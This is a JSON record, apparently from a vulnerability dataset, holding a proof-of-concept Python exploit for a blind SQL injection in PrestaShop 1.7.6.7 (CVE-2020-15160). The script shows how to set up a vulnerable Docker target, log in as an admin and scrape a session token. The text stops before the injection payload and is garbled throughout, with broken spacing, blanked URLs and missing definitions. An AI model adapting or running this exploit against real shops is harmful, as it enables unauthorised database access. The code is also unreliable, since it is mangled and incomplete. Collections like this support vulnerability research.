{
    "text": "vul_name : PrestaShop 1.7.6.7 SQL Injection ， vul_cve : CVE-2020-15160 ， vul_poc :  # Exploit Title : PrestaShop 1.7.6.7 - 'location' Blind Sql Injection ，  # Date : 2021-04-08 ，  # Exploit Author : Vanshal Gaur ，  # Vendor Homepage :  ，  # Version : 1.7.5.x < 1.7.6.8 ，  # Tested on : Debian 10 ( buster )  ，  # CVE : CVE-2020-15160 ，  #  ! /usr/bin/python3 ， ' ， Setup Vulnerable Docker on \"localhost : 8080\" :  ， docker network create prestashop-net ， docker run -ti -name mysql_z -network prestashop-net -e MYSQL_ROOT_PASSWORD=admin -p 3307 : 3306 -d mysql : 5.7 ， docker run -ti -name prestashop_z -network prestashop-net -e DB_SERVER=mysql_z -p 8080 : 80 -d prestashop/prestashop : 1.7.6.7 ， ' ， from lxml import html ， print (  ， ' ， Exploit By : Vanshal Gaur ， Twitter Handle :  @ Vanshalg ， Exploit : CVE-2020-15160 PrestaShop blind Sql Injection 1.7.5.0 < 1.7.6.8 ， Before Running the script make sure to login and change \"Combinations\" to \"Simple product\" of the product and give that productid. ， Script will retrive the output of user (  ) function , edit payload in script to retrive other data ( Tested With Prestashop 1.7.6.7 )  ， Usage : python3 {} email password localhost 8080 productid /adminpath ， python3 exploit.py \"test @ gmail.com\" \"password\" localhost 8080 11 /admin123 ， '.format ( sys.argv [ 0 ]  )  ， sys.exit ( 1 )  ， print ( \"Exploiting. ( Be Patient ) \\n\" )  ， email = sys.argv [ 1 ]  ， password = sys.argv [ 2 ]  ， target_host = sys.argv [ 3 ]  ， target_port = sys.argv [ 4 ]  ， product_id = sys.argv [ 5 ]  ， admin_path = sys.argv [ 6 ]  ， target = \" ，  # proxies = {\"http\" : \" \"https\" : \" ， s = requests.Session (  )  ， url = target+admin_path+\"/index.php\" ， data = {\"ajax\" : \"1\" , \"token\" : ' , \"controller\" : \"AdminLogin\" , \"submitLogin\" : \"1\" , \"passwd\" : \"TEMP\" , \"email\" : \"test @ email.com\"} ， data [ \"passwd\" ] = password ， data [ \"email\" ] = email ， r = s.post ( url , data=data )  ， login ( s , target , password , email , admin_path )  ， token_ext = s.get ( target+admin_path+\"/\" )  ， token_junk = re.findall ( \"sell/catalog/pro. * _token\\=. * \" , token_ext.text )  ， token_spit = re.split ( \"\\\" , token_junk [ 0 ]  )  ， token_2 = re.split ( \"\\?\" , token_spit [ 0 ]  )  ， token = token_2 [ 1 ] ",
    "time": "2021.04.09"
}